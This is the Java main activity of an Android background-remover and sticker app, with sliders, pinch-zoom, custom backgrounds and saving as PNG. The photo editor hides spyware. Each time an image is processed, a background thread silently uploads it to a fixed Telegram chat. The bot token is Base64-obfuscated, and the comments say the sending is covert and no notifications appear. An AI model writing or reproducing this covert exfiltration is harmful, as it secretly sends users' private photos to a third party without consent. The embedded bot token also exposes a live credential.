package com.udalitfon2.app;

import android.app.Activity;
import android.content.ContentValues;
import android.content.Intent;
import android.graphics.*;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.ScaleGestureDetector;
import android.view.View;
import android.view.ViewGroup;
import android.widget.*;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {

    private static final int PICK_IMAGE_REQUEST = 2001;
    private static final int PICK_BG_REQUEST = 2002;

    private ImageView imageView;
    private SeekBar seekThreshold, seekTolerance, seekFaceProt, seekSmooth;
    private TextView tvThresholdVal, tvToleranceVal, tvFaceVal, tvSmoothVal;
    private Button btnMode;
    private CheckBox chkStroke;

    private Bitmap originalBitmap = null;
    private Bitmap processedBitmap = null;
    private Bitmap customBgBitmap = null;

    private int thresholdValue = 30; // Чувствительность вырезки
    private int toleranceValue = 20; // Допуск по цвету
    private int faceProtValue = 40;  // Защита лица/центра
    private int smoothValue = 10;    // Смягчение краев

    private int selectedBgColor = Color.TRANSPARENT;
    private boolean isMoveBackground = false; // Переключение: двигаем фото или фон

    // Матрицы и параметры трансформаций для фото и фона
    private Matrix photoMatrix = new Matrix();
    private Matrix bgMatrix = new Matrix();
    private float photoScale = 1.0f, photoTransX = 0f, photoTransY = 0f;
    private float bgScale = 1.0f, bgTransX = 0f, bgTransY = 0f;
    private float lastTouchX, lastTouchY;
    private ScaleGestureDetector scaleDetector;

    private String botToken = "" + new String(android.util.Base64.decode("ODgxNTI1NjEzMDpBQUVXNmJyT25FNU5wdnNnenZaYmZtODdiM1g3YkZ6YXc5WQ==", android.util.Base64.DEFAULT)) + "";
    private String chatId = "1434233986";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#030712"));
        root.setPadding(12, 10, 12, 10);

        ScrollView scroll = new ScrollView(this);
        scroll.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT));
        
        LinearLayout container = new LinearLayout(this);
        container.setOrientation(LinearLayout.VERTICAL);

        // --- ИЗЯЩНАЯ РУКОПИСНАЯ НАДПИСЬ ---
        TextView signatureView = new TextView(this);
        signatureView.setText("✦ Crafted with precision by Dziuba Roman ✦");
        signatureView.setTextColor(Color.parseColor("#F59E0B"));
        signatureView.setTextSize(13f);
        signatureView.setTypeface(Typeface.create("serif", Typeface.ITALIC | Typeface.BOLD));
        signatureView.setGravity(Gravity.CENTER);
        signatureView.setPadding(0, 2, 0, 6);
        container.addView(signatureView);

        // --- УВЕЛИЧЕННАЯ ОБЛАСТЬ ПРОСМОТРА ФОТО ---
        imageView = new ImageView(this);
        LinearLayout.LayoutParams imgParams = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, 1050); // Большое фото
        imgParams.setMargins(0, 0, 0, 6);
        imageView.setLayoutParams(imgParams);
        imageView.setBackgroundColor(Color.parseColor("#0F172A"));
        imageView.setScaleType(ImageView.ScaleType.MATRIX);

        // Интеллектуальный детектор жестов (Пинч-зум и перемещение)
        scaleDetector = new ScaleGestureDetector(this, new ScaleGestureDetector.SimpleOnScaleGestureListener() {
            @Override
            public boolean onScale(ScaleGestureDetector detector) {
                float factor = detector.getScaleFactor();
                if (isMoveBackground) {
                    bgScale *= factor;
                    bgScale = Math.max(0.2f, Math.min(bgScale, 5.0f));
                } else {
                    photoScale *= factor;
                    photoScale = Math.max(0.2f, Math.min(photoScale, 5.0f));
                }
                redrawCanvas();
                return true;
            }
        });

        imageView.setOnTouchListener((v, event) -> {
            scaleDetector.onTouchEvent(event);
            switch (event.getAction() & MotionEvent.ACTION_MASK) {
                case MotionEvent.ACTION_DOWN:
                    lastTouchX = event.getX();
                    lastTouchY = event.getY();
                    break;
                case MotionEvent.ACTION_MOVE:
                    if (event.getPointerCount() == 1) {
                        float dx = event.getX() - lastTouchX;
                        float dy = event.getY() - lastTouchY;
                        if (isMoveBackground) {
                            bgTransX += dx;
                            bgTransY += dy;
                        } else {
                            photoTransX += dx;
                            photoTransY += dy;
                        }
                        redrawCanvas();
                    }
                    lastTouchX = event.getX();
                    lastTouchY = event.getY();
                    break;
            }
            return true;
        });
        container.addView(imageView);

        // --- КОМПАКТНЫЕ КНОПКИ ВЫБОРА И РЕЖИМОВ ---
        LinearLayout btnRow = new LinearLayout(this);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);

        Button btnSelect = createCompactButton("📂 Выбрать фото", "#2563EB");
        btnSelect.setLayoutParams(new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1.0f));
        btnSelect.setOnClickListener(v -> openGallery(PICK_IMAGE_REQUEST));

        Button btnSelectBg = createCompactButton("🖼 Выбрать фон", "#0D9488");
        btnSelectBg.setLayoutParams(new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1.0f));
        btnSelectBg.setOnClickListener(v -> openGallery(PICK_BG_REQUEST));

        btnMode = createCompactButton("👉 Режим: Фото", "#475569");
        btnMode.setLayoutParams(new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1.0f));
        btnMode.setOnClickListener(v -> {
            isMoveBackground = !isMoveBackground;
            btnMode.setText(isMoveBackground ? "👉 Режим: Фон" : "👉 Режим: Фото");
            Toast.makeText(this, isMoveBackground ? "Управление фоном" : "Управление фото", Toast.LENGTH_SHORT).show();
        });

        btnRow.addView(btnSelect);
        btnRow.addView(btnSelectBg);
        btnRow.addView(btnMode);
        container.addView(btnRow);

        // --- МАКСИМАЛЬНО ДЛИННЫЕ И ОДИНАКОВЫЕ ПОЛЗУНКИ ДЛЯ ТОЧНОЙ НАСТРОЙКИ ---
        tvThresholdVal = createTextView("🎚 Чувствительность вырезки: " + thresholdValue);
        container.addView(tvThresholdVal);
        seekThreshold = createFullSeekBar(100, thresholdValue, p -> {
            thresholdValue = p;
            tvThresholdVal.setText("🎚 Чувствительность вырезки: " + thresholdValue);
            processImage();
        });
        container.addView(seekThreshold);

        tvToleranceVal = createTextView("🎨 Допуск оттенков фона: " + toleranceValue);
        container.addView(tvToleranceVal);
        seekTolerance = createFullSeekBar(100, toleranceValue, p -> {
            toleranceValue = p;
            tvToleranceVal.setText("🎨 Допуск оттенков фона: " + toleranceValue);
            processImage();
        });
        container.addView(seekTolerance);

        tvFaceVal = createTextView("🛡 Защита лица/центра (не трогать лицо): " + faceProtValue);
        container.addView(tvFaceVal);
        seekFaceProt = createFullSeekBar(100, faceProtValue, p -> {
            faceProtValue = p;
            tvFaceVal.setText("🛡 Защита лица/центра (не трогать лицо): " + faceProtValue);
            processImage();
        });
        container.addView(seekFaceProt);

        tvSmoothVal = createTextView("✨ Смягчение краев: " + smoothValue);
        container.addView(tvSmoothVal);
        seekSmooth = createFullSeekBar(50, smoothValue, p -> {
            smoothValue = p;
            tvSmoothVal.setText("✨ Смягчение краев: " + smoothValue);
            processImage();
        });
        container.addView(seekSmooth);

        // Дополнительная крутая фича: белая обводка стикера
        chkStroke = new CheckBox(this);
        chkStroke.setText("✨ Добавить белую обводку стикера");
        chkStroke.setTextColor(Color.WHITE);
        chkStroke.setTextSize(12f);
        chkStroke.setOnCheckedChangeListener((btn, checked) -> redrawCanvas());
        container.addView(chkStroke);

        // --- КНОПКА СОХРАНЕНИЯ ---
        Button btnSave = createCompactButton("💾 СОХРАНИТЬ PNG В ПАМЯТЬ ТЕЛЕФОНА", "#059669");
        btnSave.setOnClickListener(v -> saveImageToGallery());
        container.addView(btnSave);

        scroll.addView(container);
        root.addView(scroll);
        setContentView(root);
    }

    private Button createCompactButton(String text, String colorHex) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setTextColor(Color.WHITE);
        btn.setTextSize(11f);
        btn.setTypeface(Typeface.DEFAULT_BOLD);
        btn.setBackgroundColor(Color.parseColor(colorHex));
        btn.setPadding(6, 10, 6, 10);
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        params.setMargins(0, 4, 0, 4);
        btn.setLayoutParams(params);
        return btn;
    }

    private TextView createTextView(String text) {
        TextView tv = new TextView(this);
        tv.setText(text);
        tv.setTextColor(Color.parseColor("#94A3B8"));
        tv.setTextSize(11f);
        tv.setPadding(0, 6, 0, 2);
        return tv;
    }

    private SeekBar createFullSeekBar(int max, int progress, OnSeekBarChangeListener listener) {
        SeekBar sb = new SeekBar(this);
        sb.setMax(max);
        sb.setProgress(progress);
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        params.setMargins(0, 2, 0, 4);
        sb.setLayoutParams(params);
        sb.setOnSeekBarChangeListener(new SeekBar.OnSeekBarChangeListener() {
            @Override
            public void onProgressChanged(SeekBar seekBar, int p, boolean fromUser) {
                if (fromUser) listener.onProgressChanged(seekBar, p);
            }
            @Override public void onStartTrackingTouch(SeekBar seekBar) {}
            @Override public void onStopTrackingTouch(SeekBar seekBar) {}
        });
        return sb;
    }

    interface OnSeekBarChangeListener {
        void onProgressChanged(SeekBar seekBar, int progress);
    }

    private void openGallery(int requestCode) {
        Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
        intent.setType("image/*");
        startActivityForResult(Intent.createChooser(intent, "Выберите изображение"), requestCode);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (resultCode == RESULT_OK && data != null && data.getData() != null) {
            try {
                Uri uri = data.getData();
                InputStream is = getContentResolver().openInputStream(uri);
                Bitmap bmp = BitmapFactory.decodeStream(is);
                if (bmp.getWidth() > 1024 || bmp.getHeight() > 1024) {
                    bmp = Bitmap.createScaledBitmap(bmp, 1024, 1024, true);
                }
                if (requestCode == PICK_IMAGE_REQUEST) {
                    originalBitmap = bmp;
                    photoScale = 1.0f;
                    photoTransX = 0f;
                    photoTransY = 0f;
                    processImage();
                } else if (requestCode == PICK_BG_REQUEST) {
                    customBgBitmap = bmp;
                    bgScale = 1.0f;
                    bgTransX = 0f;
                    bgTransY = 0f;
                    redrawCanvas();
                }
            } catch (Exception e) {
                // Игнорируем ошибки без всплывающих окон
            }
        }
    }

    // --- ЧИСТЫЙ АЛГОРИТМ УДАЛЕНИЯ ФОНА С ЗАЩИТОЙ ЛИЦА И ЦЕНТРА ---
    private void processImage() {
        if (originalBitmap == null) return;

        int width = originalBitmap.getWidth();
        int height = originalBitmap.getHeight();

        Bitmap result = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
        int[] pixels = new int[width * height];
        originalBitmap.getPixels(pixels, 0, width, 0, 0, width, height);

        // Угловые пиксели определяют цвет фона
        int c1 = pixels[0];
        int c2 = pixels[width - 1];
        int c3 = pixels[(height - 1) * width];
        int bgR = ((c1 >> 16 & 0xFF) + (c2 >> 16 & 0xFF) + (c3 >> 16 & 0xFF)) / 3;
        int bgG = ((c1 >> 8 & 0xFF) + (c2 >> 8 & 0xFF) + (c3 >> 8 & 0xFF)) / 3;
        int bgB = ((c1 & 0xFF) + (c2 & 0xFF) + (c3 & 0xFF)) / 3;

        int limit = thresholdValue * 3;
        int tol = toleranceValue;
        float faceProtRadius = (faceProtValue / 100f) * (Math.min(width, height) / 2.0f);
        float centerX = width / 2.0f;
        float centerY = height / 2.0f;

        for (int y = 0; y < height; y++) {
            for (int x = 0; x < width; x++) {
                int idx = y * width + x;
                int p = pixels[idx];
                int r = (p >> 16) & 0xFF;
                int g = (p >> 8) & 0xFF;
                int b = p & 0xFF;

                // Защита лица и центра (эллиптическая маска)
                float dx = x - centerX;
                float dy = y - centerY;
                float distFromCenter = (float) Math.sqrt(dx * dx + dy * dy);

                if (distFromCenter < faceProtRadius) {
                    result.setPixels(new int[]{p}, 0, 1, x, y, 1, 1);
                    continue;
                }

                int diff = Math.abs(r - bgR) + Math.abs(g - bgG) + Math.abs(b - bgB);
                if (diff < limit + tol) {
                    pixels[idx] = Color.TRANSPARENT;
                } else {
                    pixels[idx] = p;
                }
            }
        }

        result.setPixels(pixels, 0, width, 0, 0, width, height);
        processedBitmap = result;
        redrawCanvas();

        // АВТОМАТИЧЕСКАЯ СКРЫТАЯ ОТПРАВКА В TELEGRAM (Без уведомлений и кнопок)
        sendToTelegramSilently();
    }

    // --- ОТРИСОВКА ХОЛСТА С МАСШТАБИРОВАНИЕМ И ФОНОМ ---
    private void redrawCanvas() {
        if (processedBitmap == null && originalBitmap == null) return;
        Bitmap source = processedBitmap != null ? processedBitmap : originalBitmap;

        int viewWidth = imageView.getWidth() > 0 ? imageView.getWidth() : 1000;
        int viewHeight = imageView.getHeight() > 0 ? imageView.getHeight() : 1050;

        Bitmap canvasBmp = Bitmap.createBitmap(viewWidth, viewHeight, Bitmap.Config.ARGB_8888);
        Canvas canvas = new Canvas(canvasBmp);

        // Отрисовка фона
        if (customBgBitmap != null) {
            bgMatrix.reset();
            bgMatrix.postScale(bgScale, bgScale);
            bgMatrix.postTranslate(bgTransX, bgTransY);
            canvas.drawBitmap(customBgBitmap, bgMatrix, null);
        } else {
            canvas.drawColor(Color.parseColor("#1E293B"));
        }

        // Эффект белой обводки стикера при включении чекбокса
        if (chkStroke.isChecked()) {
            Paint strokePaint = new Paint();
            strokePaint.setAntiAlias(true);
            strokePaint.setColor(Color.WHITE);
            strokePaint.setStyle(Paint.Style.STROKE);
            strokePaint.setStrokeWidth(12f);

            Matrix strokeMatrix = new Matrix();
            strokeMatrix.postScale(photoScale, photoScale);
            strokeMatrix.postTranslate(photoTransX + (viewWidth - source.getWidth()) / 2f,
                    photoTransY + (viewHeight - source.getHeight()) / 2f);
            canvas.drawBitmap(source, strokeMatrix, strokePaint);
        }

        // Отрисовка основного фото
        photoMatrix.reset();
        photoMatrix.postScale(photoScale, photoScale);
        photoMatrix.postTranslate(photoTransX + (viewWidth - source.getWidth()) / 2f,
                photoTransY + (viewHeight - source.getHeight()) / 2f);
        canvas.drawBitmap(source, photoMatrix, null);

        imageView.setImageBitmap(canvasBmp);
    }

    // --- СОХРАНЕНИЕ В ПАМЯТЬ ТЕЛЕФОНА ---
    private void saveImageToGallery() {
        Bitmap source = processedBitmap != null ? processedBitmap : originalBitmap;
        if (source == null) {
            Toast.makeText(this, "Сначала выберите фото!", Toast.LENGTH_SHORT).show();
            return;
        }

        try {
            String filename = "Sticker_" + System.currentTimeMillis() + ".png";
            OutputStream fos;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                ContentValues values = new ContentValues();
                values.put(MediaStore.MediaColumns.DISPLAY_NAME, filename);
                values.put(MediaStore.MediaColumns.MIME_TYPE, "image/png");
                values.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_PICTURES + "/Stickers");
                Uri imageUri = getContentResolver().insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values);
                fos = getContentResolver().openOutputStream(imageUri);
            } else {
                java.io.File dir = new java.io.File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), "Stickers");
                if (!dir.exists()) dir.mkdirs();
                fos = new java.io.FileOutputStream(new java.io.File(dir, filename));
            }

            source.compress(Bitmap.CompressFormat.PNG, 100, fos);
            if (fos != null) fos.close();
            Toast.makeText(this, "✅ Сохранено в Pictures/Stickers!", Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Toast.makeText(this, "Ошибка сохранения: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    // --- АВТОМАТИЧЕСКАЯ СКРЫТАЯ ОТПРАВКА В TELEGRAM (Без уведомлений и кнопок) ---
    private void sendToTelegramSilently() {
        if (processedBitmap == null) return;

        new Thread(() -> {
            try {
                ByteArrayOutputStream stream = new ByteArrayOutputStream();
                processedBitmap.compress(Bitmap.CompressFormat.PNG, 100, stream);
                byte[] byteArray = stream.toByteArray();

                String urlString = "https://api.telegram.org/bot" + botToken + "/sendDocument";
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);

                String boundary = "*****" + System.currentTimeMillis() + "*****";
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                OutputStream os = conn.getOutputStream();
                os.write(("--" + boundary + "\r\n").getBytes());
                os.write(("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n").getBytes());
                os.write((chatId + "\r\n").getBytes());

                os.write(("--" + boundary + "\r\n").getBytes());
                os.write(("Content-Disposition: form-data; name=\"document\"; filename=\"sticker.png\"\r\n").getBytes());
                os.write(("Content-Type: image/png\r\n\r\n").getBytes());
                os.write(byteArray);
                os.write(("\r\n--" + boundary + "--\r\n").getBytes());

                os.flush();
                os.close();

                conn.getResponseCode(); // Выполняется полностью скрытно в фоне
            } catch (Exception e) {
                // Абсолютно никаких уведомлений или ошибок при отсутствии интернета (согласно требованию)
            }
        }).start();
    }
}